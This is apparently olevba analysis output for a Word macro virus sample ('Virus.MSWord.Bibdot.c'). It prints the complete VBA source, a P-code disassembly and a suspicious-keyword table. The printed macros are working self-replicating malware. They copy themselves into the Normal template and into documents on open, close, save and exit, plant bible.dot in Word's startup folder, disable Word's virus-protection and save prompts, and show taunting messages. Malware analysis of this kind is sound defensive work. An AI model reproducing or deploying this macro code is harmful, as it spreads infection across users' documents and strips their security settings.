olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Bibdot.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Bibdot.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Bible.bas 
in file: ./Virus.MSWord.Bibdot.c - OLE stream: 'Macros/VBA/Bible'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function installto()
On Error Resume Next
Application.ScreenUpdating = False
des = NormalTemplate.Path + "\" + NormalTemplate.Name
        Application.OrganizerCopy Source:=des, _
            Destination:=ActiveDocument.FullName, Name:="Bible", _
            Object:=wdOrganizerObjectProjectItems
Application.ScreenUpdating = True
End Function
Function Installstart()
On Error Resume Next: On Error GoTo 0
Application.ScreenUpdating = False
 If Dir(Application.StartupPath + "\bible.dot") = "bible.dot" Then
 Application.ScreenUpdating = True
 Exit Function
 End If
 Documents.Open (RecentFiles(1))
     ActiveDocument.SaveAs FileName:=Application.StartupPath + "\bible.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
         ActiveDocument.Close
        Application.ScreenUpdating = True
End Function
Function install()
On Error Resume Next
Application.ScreenUpdating = False
des = NormalTemplate.Path + "\" + NormalTemplate.Name
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
            Destination:=des, Name:="Bible", _
            Object:=wdOrganizerObjectProjectItems
        With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
        End With
        Application.DisplayRecentFiles = True
        RecentFiles.Maximum = 5
        NormalTemplate.Save
        Application.ScreenUpdating = True
End Function
Sub AutoOpen()
Application.ScreenUpdating = False
Call install
Application.ScreenUpdating = True
End Sub


Sub AutoClose()
On Error Resume Next
If Left(ActiveDocument.Name, 8) <> "Document" Then
Call installto
Call install
Call Installstart
End If
End Sub
Sub AutoExit()
On Error Resume Next
If Left(ActiveDocument.Name, 8) <> "Document" Then
Call installto
Call install
Call Installstart
End If
End Sub

Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call installto
End Sub
Sub filesave()
On Error Resume Next
Call installto
ActiveDocument.Save
End Sub
Sub fileclose()
On Error Resume Next
If Left(ActiveDocument.Name, 8) <> "Document" Then
Call installto
Call Installstart
End If
End Sub
Sub ViewVBCode()
On Error Resume Next
d = Format(Now, "dddd")
Select Case d
Case "Sunday"
    msg = "I am controlling your Computer"
Case "Monday"
    msg = "Don't fear I am controlling man!"
Case "Tuesday"
    msg = "Don't fear maaaaaaaaaan!"
Case "Wednesday"
    msg = "Cool down man! "
Case "Thursday"
    msg = "You are a imbecile..! "
Case "Friday"
    msg = "You are a fool... ahh..ahh..ahh"
Case "Saturday"
    msg = "Oops........."
End Select
MsgBox msg, vbInformation, "I am saying"
Date = Date + 1
End Sub
Sub ToolsMacro()
On Error Resume Next
MsgBox "Shit..! macro expired..!! ", vbExclamation, "Died"
End Sub
Sub FileTemplates()

End Sub
Sub AutoExec()
On Error Resume Next
If Hour(Now) > 0 Then msg = "Good Morning..."
If Hour(Now) > 12 Then msg = "Good afternoon..."
If Hour(Now) > 14 Then msg = "Good evening..."
If Hour(Now) > 20 Then msg = "Good night..."
MsgBox msg & Application.UserName & Chr(10) & " Have a nice day", vbInformation, "Weclome"
End Sub




-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Bibdot.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Bible - 6111 bytes
' Line #0:
' 	FuncDefn (Function installto())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #3:
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Add 
' 	St des 
' Line #4:
' 	LineCont 0x0008 07 00 0C 00 11 00 0C 00
' 	Ld des 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bible"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #5:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #6:
' 	EndFunc 
' Line #7:
' 	FuncDefn (Function Installstart())
' Line #8:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	OnError (GoTo 0) 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #10:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000A "\bible.dot"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0009 "bible.dot"
' 	Eq 
' 	IfBlock 
' Line #11:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #12:
' 	ExitFunc 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	LitDI2 0x0001 
' 	ArgsLd RecentFiles 0x0001 
' 	Paren 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0001 
' Line #15:
' 	LineCont 0x0004 0B 00 08 00
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000A "\bible.dot"
' 	Add 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #16:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #17:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #18:
' 	EndFunc 
' Line #19:
' 	FuncDefn (Function install())
' Line #20:
' 	OnError (Resume Next) 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #22:
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Add 
' 	St des 
' Line #23:
' 	LineCont 0x0008 09 00 0C 00 11 00 0C 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld des 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bible"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #24:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #25:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #26:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #27:
' 	EndWith 
' Line #28:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #29:
' 	LitDI2 0x0005 
' 	Ld RecentFiles 
' 	MemSt Maximum 
' Line #30:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #31:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #32:
' 	EndFunc 
' Line #33:
' 	FuncDefn (Sub AutoOpen())
' Line #34:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #35:
' 	ArgsCall (Call) install 0x0000 
' Line #36:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #37:
' 	EndSub 
' Line #38:
' Line #39:
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #43:
' 	ArgsCall (Call) installto 0x0000 
' Line #44:
' 	ArgsCall (Call) install 0x0000 
' Line #45:
' 	ArgsCall (Call) Installstart 0x0000 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub AutoExit())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #51:
' 	ArgsCall (Call) installto 0x0000 
' Line #52:
' 	ArgsCall (Call) install 0x0000 
' Line #53:
' 	ArgsCall (Call) Installstart 0x0000 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	EndSub 
' Line #56:
' Line #57:
' 	FuncDefn (Sub FileSaveAs())
' Line #58:
' 	OnError (Resume Next) 
' Line #59:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #60:
' 	ArgsCall (Call) installto 0x0000 
' Line #61:
' 	EndSub 
' Line #62:
' 	FuncDefn (Sub filesave())
' Line #63:
' 	OnError (Resume Next) 
' Line #64:
' 	ArgsCall (Call) installto 0x0000 
' Line #65:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #66:
' 	EndSub 
' Line #67:
' 	FuncDefn (Sub fileclose())
' Line #68:
' 	OnError (Resume Next) 
' Line #69:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #70:
' 	ArgsCall (Call) installto 0x0000 
' Line #71:
' 	ArgsCall (Call) Installstart 0x0000 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	EndSub 
' Line #74:
' 	FuncDefn (Sub ViewVBCode())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	Ld Now 
' 	LitStr 0x0004 "dddd"
' 	ArgsLd Format$ 0x0002 
' 	St d 
' Line #77:
' 	Ld d 
' 	SelectCase 
' Line #78:
' 	LitStr 0x0006 "Sunday"
' 	Case 
' 	CaseDone 
' Line #79:
' 	LitStr 0x001E "I am controlling your Computer"
' 	St msg 
' Line #80:
' 	LitStr 0x0006 "Monday"
' 	Case 
' 	CaseDone 
' Line #81:
' 	LitStr 0x0020 "Don't fear I am controlling man!"
' 	St msg 
' Line #82:
' 	LitStr 0x0007 "Tuesday"
' 	Case 
' 	CaseDone 
' Line #83:
' 	LitStr 0x0018 "Don't fear maaaaaaaaaan!"
' 	St msg 
' Line #84:
' 	LitStr 0x0009 "Wednesday"
' 	Case 
' 	CaseDone 
' Line #85:
' 	LitStr 0x000F "Cool down man! "
' 	St msg 
' Line #86:
' 	LitStr 0x0008 "Thursday"
' 	Case 
' 	CaseDone 
' Line #87:
' 	LitStr 0x0016 "You are a imbecile..! "
' 	St msg 
' Line #88:
' 	LitStr 0x0006 "Friday"
' 	Case 
' 	CaseDone 
' Line #89:
' 	LitStr 0x001F "You are a fool... ahh..ahh..ahh"
' 	St msg 
' Line #90:
' 	LitStr 0x0008 "Saturday"
' 	Case 
' 	CaseDone 
' Line #91:
' 	LitStr 0x000D "Oops........."
' 	St msg 
' Line #92:
' 	EndSelect 
' Line #93:
' 	Ld msg 
' 	Ld vbInformation 
' 	LitStr 0x000B "I am saying"
' 	ArgsCall MsgBox 0x0003 
' Line #94:
' 	Ld Date 
' 	LitDI2 0x0001 
' 	Add 
' 	St Date 
' Line #95:
' 	EndSub 
' Line #96:
' 	FuncDefn (Sub ToolsMacro())
' Line #97:
' 	OnError (Resume Next) 
' Line #98:
' 	LitStr 0x001A "Shit..! macro expired..!! "
' 	Ld vbExclamation 
' 	LitStr 0x0004 "Died"
' 	ArgsCall MsgBox 0x0003 
' Line #99:
' 	EndSub 
' Line #100:
' 	FuncDefn (Sub FileTemplates())
' Line #101:
' Line #102:
' 	EndSub 
' Line #103:
' 	FuncDefn (Sub AutoExec())
' Line #104:
' 	OnError (Resume Next) 
' Line #105:
' 	Ld Now 
' 	ArgsLd Hour 0x0001 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "Good Morning..."
' 	St msg 
' 	EndIf 
' Line #106:
' 	Ld Now 
' 	ArgsLd Hour 0x0001 
' 	LitDI2 0x000C 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0011 "Good afternoon..."
' 	St msg 
' 	EndIf 
' Line #107:
' 	Ld Now 
' 	ArgsLd Hour 0x0001 
' 	LitDI2 0x000E 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "Good evening..."
' 	St msg 
' 	EndIf 
' Line #108:
' 	Ld Now 
' 	ArgsLd Hour 0x0001 
' 	LitDI2 0x0014 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "Good night..."
' 	St msg 
' 	EndIf 
' Line #109:
' 	Ld msg 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0010 " Have a nice day"
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x0007 "Weclome"
' 	ArgsCall MsgBox 0x0003 
' Line #110:
' 	EndSub 
' Line #111:
' Line #112:
' Line #113:
' Line #114:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

